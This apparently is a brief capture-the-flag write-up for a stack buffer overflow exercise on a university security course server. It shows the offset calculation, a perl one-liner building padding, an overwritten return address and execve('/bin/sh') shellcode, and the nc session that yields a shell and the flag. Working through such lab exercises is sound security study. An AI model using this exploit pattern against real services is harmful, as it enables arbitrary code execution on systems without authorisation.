the address of char[] "bbb" = 0xffffcd60

```
$ nc secprog.cs.nctu.edu.tw 10101
bbb
Your input is: (0xffffcd44) bbb
```

EIP = garbage(24) + 1byte = 0xffffcd44 + 28 = 0xffffcd60

```
In [7]: hex(0xffffcd44 + 28)
Out[7]: '0xffffcd60'
```

exploit = garbage + EIP + shellcode

```
$ perl -E 'say "a"x24 ."\x60\xcd\xff\xff". "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"' > test

$ cat test - | nc secprog.cs.nctu.edu.tw 10101
cat /home/bof/flag1
SECPROG{HelloOverflow}
```

Appendix:

shellcode from here
http://shell-storm.org/shellcode/files/shellcode-827.php
